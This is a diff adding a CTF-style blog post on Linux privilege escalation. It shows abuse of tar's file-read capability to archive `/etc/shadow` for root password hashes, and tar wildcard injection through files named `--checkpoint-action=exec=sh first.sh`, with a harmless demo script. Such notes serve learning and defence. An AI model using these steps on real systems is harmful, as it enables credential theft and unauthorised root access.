@@ -1,0 +1,150 @@
+---
+layout: post
+title:  "Linux Privilege Escalation"
+date:   2020-04-15 14:20:58 +0530
+categories : [CTF]
+tags: [linux, infrastructure]
+---
+
+# Table of Content
+* [Linux Capabilities](#linux-capabilities)
+* [`tar`](#all-about-tar)
+* [`-` in filename](#dashed-filename)
+* [`--` and `tar`](#double-dash-tar)
+
+## Linux Capabilities
+
+Refs:
+
+* <https://www.kernel.org/doc/ols/2008/ols2008v1-pages-163-172.pdf>
+* <https://www.andreasch.com/2018/01/13/capabilities/>
+
+Let us take an example
+```
+student@localhost:~$ getcap -r / 2>/dev/null 
+/bin/tar = cap_dac_read_search+ep
+```
+Because we are running this on all files of the system, there might be some files on which the current user won't have access. And, trying to access those will throw an error. So,  `2>/dev/null` is to redirect the errors to /dev/null instead of printing them on the console. It is not necessary to use, it is just a trick that most people use to avoid printing the errors.
+
+Here, we see that `tar` program has the capability to read and search, while as a normal user we don't have the root read access, we can verify the same by trying to access the `/etc/shadow` file
+
+```
+$ cat /etc/shadow
+cat: /etc/shadow: Permission denied
+```
+
+## All about tar
+### Flags / Options
+In order to create a .tar file we can use following flags :
+```
+-c, --create : create a new archive
+-x, --extract, --get : extract files from an archive
+-f, --file=ARCHIVE : use archive file or device ARCHIVE
+-j, --bzip2 : filter the archive through bzip2
+-v, --verbose : verbosely list files processed
+-z, --gzip :filter the archive through gzip
+``` 
+### Tar & zip
+Note : `-f` flag has to be used in the end, immediately preceding the destination `filename`.
+
+```
+$ tar -cvf ~/shadow.tar shadow
+$ ls
+shadow.tar
+```
+If we also want to zip the file we can use either `-z` or `-j` flag
+```
+$ tar -cvzf ~/shadow.tar.gz shadow
+$ ls 
+shadow.tar.gz
+```
+### Untar
+
+In order to extract the `.tar` file we need to use `-x`
+```
+$ tar -xvf ./shadow.tar
+$ ls
+shadow
+```
+Now we can read the contents of the file by using `cat shadow`. It will enable us to extract the hashes of the root user password. 
+
+## Dashed filename
+Refs :
+* <https://overthewire.org/wargames/bandit/bandit2.html>
+* <https://dynamicparallax.wordpress.com/2015/09/22/bandit-level-1-to-level-2/>
+
+Using `-` as a filename means stdin/stdout as a convention that a lot of programs use. When cat sees the string `–` as a filename, it treats it as a synonym for stdin.
+What will happen in our case is cat `–` echoes stdin, in this case keyboard user input, to stdout, the terminal window.
+
+```
+$ echo "Hello World" > -
+$ cat -
+hi
+hi
+good day
+good day
+^C
+$ cat ./-
+Hello World
+```
+
+The other problem is that Linux command options usually start with a dash ( - ). If you try to type that filename on a command line, the command might think you’re trying to type a command option.
+
+## Double Dash Tar
+Let us create few files for archiving and a bash script for printing `Hello World`.
+
+```
+$ touch 1 2 3 4 5
+$ cat first.sh 
+#!/bin/sh
+echo Hello World       
+```
+Let us create two more empty files
+```
+$ echo "" > "--checkpoint-action=exec=sh first.sh"
+$ echo "" > --checkpoint=1
+```
+`checkpoint` is an optional argument in the `tar` command
+```
+--checkpoint[=NUMBER]      : display progress messages every NUMBERth record (default 10)
+--checkpoint-action=ACTION : execute ACTION on each checkpoint
+``` 
+Now, `-` or `--` in filenames are treated as arguments to the command line utilities. `tar` command, instead of reading them as files for archiving will treat them as arguments. We have seen the case of `cat` with `-filename` previously. 
+
+The directory at this point looks like this
+```
+$ ls -la
+total 20
+drwxr-xr-x  2 student student 4096 Apr 15 22:57  .
+drwxr-xr-x 42 student student 4096 Apr 15 22:34  ..
+-rw-r--r--  1 student student    0 Apr 15 20:36  1
+-rw-r--r--  1 student student    0 Apr 15 20:36  2
+-rw-r--r--  1 student student    0 Apr 15 20:36  3
+-rw-r--r--  1 student student    0 Apr 15 20:36  4
+-rw-r--r--  1 student student    0 Apr 15 20:36  5
+-rw-r--r--  1 student student    1 Apr 15 20:44 '--checkpoint=1'
+-rw-r--r--  1 student student    1 Apr 15 20:43 '--checkpoint-action=exec=sh first.sh'
+-rwxrwxrwx  1 student student   81 Apr 15 20:39  first.sh
+```
+Let us run the `tar` command and see the output
+```
+$ tar -cvf myfiles.tar *
+1
+2
+3
+4
+5
+first.sh
+Hello World
+```
+We see that our bash script `first.sh` is run. If we have to see the contents of the `.tar` file
+```
+$ tar -tvf myfiles.tar 
+-rw-r--r-- student/student   0 2020-04-15 20:36 1
+-rw-r--r-- student/student   0 2020-04-15 20:36 2
+-rw-r--r-- student/student   0 2020-04-15 20:36 3
+-rw-r--r-- student/student   0 2020-04-15 20:36 4
+-rw-r--r-- student/student   0 2020-04-15 20:36 5
+-rwxrwxrwx student/student  81 2020-04-15 20:39 first.sh
+```
+Here, we can see that the files starting with `--` are not included into the `.tar` file.
